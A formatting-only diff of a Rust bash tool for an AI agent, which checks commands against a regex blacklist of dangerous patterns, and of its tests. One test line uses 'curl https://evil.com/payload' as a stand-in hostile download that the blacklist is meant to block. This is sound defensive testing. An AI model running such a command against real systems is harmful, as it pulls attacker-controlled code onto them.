@@ -26,9 +26,8 @@ static DEFAULT_BLACKLIST: LazyLock<Vec<Regex>> = LazyLock::new(|| {
     halcon_core::security::CATASTROPHIC_PATTERNS
         .iter()
         .map(|pattern| {
-            Regex::new(pattern).unwrap_or_else(|e| {
-                panic!("Invalid built-in blacklist pattern {}: {}", pattern, e)
-            })
+            Regex::new(pattern)
+                .unwrap_or_else(|e| panic!("Invalid built-in blacklist pattern {}: {}", pattern, e))
         })
         .collect()
 });
@@ -143,7 +142,9 @@ impl Tool for BashTool {
             .ok_or_else(|| HalconError::InvalidInput("bash requires 'command' string".into()))?;
 
         if command.trim().is_empty() {
-            return Err(HalconError::InvalidInput("bash: command must not be empty".into()));
+            return Err(HalconError::InvalidInput(
+                "bash: command must not be empty".into(),
+            ));
         }
 
         // Blacklist check: block dangerous commands
@@ -253,10 +254,16 @@ mod tests {
     }
 
     fn tool_no_sandbox() -> BashTool {
-        BashTool::new(120, SandboxConfig {
-            enabled: false,
-            ..SandboxConfig::default()
-        }, vec![], false).unwrap()
+        BashTool::new(
+            120,
+            SandboxConfig {
+                enabled: false,
+                ..SandboxConfig::default()
+            },
+            vec![],
+            false,
+        )
+        .unwrap()
     }
 
     fn make_input(args: serde_json::Value) -> ToolInput {
@@ -413,11 +420,13 @@ mod tests {
         )
         .expect("valid regex should compile");
         assert!(
-            t.is_command_blacklisted("curl https://evil.com/payload").is_some(),
+            t.is_command_blacklisted("curl https://evil.com/payload")
+                .is_some(),
             "custom pattern should block matching command"
         );
         assert!(
-            t.is_command_blacklisted("curl https://good.com/data").is_none(),
+            t.is_command_blacklisted("curl https://good.com/data")
+                .is_none(),
             "custom pattern should not block non-matching command"
         );
     }
@@ -429,11 +438,13 @@ mod tests {
         let t = tool();
         // Common pattern: suppress stderr noise — must NOT be blocked
         assert!(
-            t.is_command_blacklisted("cargo build 2>/dev/null").is_none(),
+            t.is_command_blacklisted("cargo build 2>/dev/null")
+                .is_none(),
             "cargo build 2>/dev/null must be allowed"
         );
         assert!(
-            t.is_command_blacklisted("cargo check 2>/dev/null").is_none(),
+            t.is_command_blacklisted("cargo check 2>/dev/null")
+                .is_none(),
             "cargo check 2>/dev/null must be allowed"
         );
         assert!(
@@ -441,7 +452,8 @@ mod tests {
             "make 2>/dev/null must be allowed"
         );
         assert!(
-            t.is_command_blacklisted("some_cmd 2>/dev/null 1>/dev/null").is_none(),
+            t.is_command_blacklisted("some_cmd 2>/dev/null 1>/dev/null")
+                .is_none(),
             "both stdout+stderr suppressed must be allowed"
         );
     }
@@ -465,7 +477,8 @@ mod tests {
         let t = tool();
         // Redirecting stdout to /dev/null is a valid discard pattern
         assert!(
-            t.is_command_blacklisted("command_output >/dev/null").is_none(),
+            t.is_command_blacklisted("command_output >/dev/null")
+                .is_none(),
             "command >/dev/null (with real command) must be allowed"
         );
     }
